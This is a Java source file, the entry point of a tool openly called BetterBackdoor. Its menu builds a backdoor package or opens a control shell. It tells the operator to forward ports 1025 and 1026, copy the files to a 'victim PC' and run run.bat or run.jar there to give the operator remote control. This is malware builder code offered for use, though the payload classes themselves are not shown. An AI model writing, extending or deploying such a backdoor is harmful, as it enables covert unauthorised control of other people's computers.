package com.thatcherdev.betterbackdoor;

import java.io.File;
import java.nio.file.Paths;
import java.util.Scanner;

import com.thatcherdev.betterbackdoor.backend.Utils;
import com.thatcherdev.betterbackdoor.shell.Shell;

import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class BetterBackdoor {

	public final static Scanner sc = new Scanner(System.in);
	public final static String os = System.getProperty("os.name");

	/**
	 * Starts BetterBackdoor.
	 * 
	 * @param args command line arguments
	 */
	public static void main(String[] args) {
		System.out.println("_________        __    __              __________                __       .___\n"
				+ "\\_____   \\ _____/  |__/  |_  __________\\______   \\______    ____ |  | __ __| _/____   ___________ \n"
				+ " |    |  _// __ \\   __\\   __\\/ __ \\_  __ \\    |  _/\\__  \\ _/ ___\\|  |/ // __ |/  _ \\ /  _ \\_  __ \\\n"
				+ " |    |   \\  ___/|  |  |  | \\  ___/|  | \\/    |   \\ / __ \\\\  \\___|    </ /_/ (  <_> |  <_> )  | \\/\n"
				+ " |______  /\\___  >__|  |__|  \\___  >__|  |______  /(____  /\\___  >__|_ \\____ |\\____/ \\____/|__|\n"
				+ "        \\/     \\/                \\/             \\/      \\/     \\/     \\/    \\/");
		System.out.println("Welcome to BetterBackdoor\n");
		System.out.println("Select:");
		System.out.println("[0] Create backdoor");
		System.out.println("[1] Open backdoor shell");
		String choice = getInput("op01");
		if (choice.equals("0")) {
			System.out.println("Would you like this backdoor to operate within a single network, LAN, "
					+ "or over the internet, WAN (requires port forwarding):");
			System.out.println("[0] LAN");
			System.out.println("[1] WAN (requires port forwarding)");
			String ipType = null;
			if (getInput("op01").equals("0"))
				ipType = "internal";
			else
				ipType = "external";

			boolean jre = false;
			if (os.contains("Windows")) {
				System.out.println(
						"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?(y/n):");
				jre = Boolean.parseBoolean(getInput("yn"));
			} else
				System.out.println(
						"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\n"
								+ "in the current working directory create folder 'jre' containing 'bin' and 'lib' directories from a Windows JRE distribution.\n");

			System.out.println("Press ENTER to create backdoor...");
			sc.nextLine();
			System.out.println("Creating...\n");
			try {
				Setup.create(jre, ipType);
				System.out.println("Created!\n");
				if (ipType.equals("external"))
					System.out.println(
							"Using your routers settings page, forward ports 1025 and 1026 from this computer ("
									+ Utils.getIP("internal") + ") with TCP selected.\n");
				System.out.println(
						"To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC.\n"
								+ "If a JRE is packaged with the backdoor, execute run.bat, otherwise execute run.jar.\n"
								+ "This will start the backdoor on the victim's PC.\n"
								+ "To control the backdoor, return to BetterBackdoor and run option 1 at start.\n");
				System.out.println("Press ENTER to exit...");
				sc.nextLine();
			} catch (Exception e) {
				if (e.getMessage() == null)
					error("Could not create backdoor");
				else
					error("Could not create backdoor:\n" + e.getMessage());
			}
		} else
			Shell.start();
	}

	/**
	 * Gets user input and verify it's validity with {@link type}.
	 *
	 * @param type type of input
	 * @return user input
	 */
	public static String getInput(String type) {
		System.out.print(">");
		String ret = sc.nextLine();
		if (ret.isEmpty())
			return getInput(type);
		else if (type.equals("file") && !new File(ret).exists()) {
			System.out.println("\nFile not found\nEnter a valid file path:");
			return getInput(type);
		} else if (type.equals("yn") && !(ret.equalsIgnoreCase("y") || ret.equalsIgnoreCase("n"))) {
			System.out.println("\nInvalid entry\nEnter 'y' or 'n':");
			return getInput(type);
		} else if (type.startsWith("op") && (!type.substring(2).contains(ret) || !(ret.length() == 1)))
			return getInput(type);
		else
			System.out.println();

		if (type.equals("file"))
			return Paths.get(ret).toString();
		else if (type.equals("yn"))
			if (ret.equals("y"))
				return "true";
			else
				return "false";
		else
			return ret;
	}

	/**
	 * Displays "An error occurred" followed by {@link errorMessage} and exits.
	 *
	 * @param errorMessage error message to display
	 */
	public static void error(String errorMessage) {
		System.out.println("An error occurred:\n" + errorMessage + "\n");
		System.exit(0);
	}
}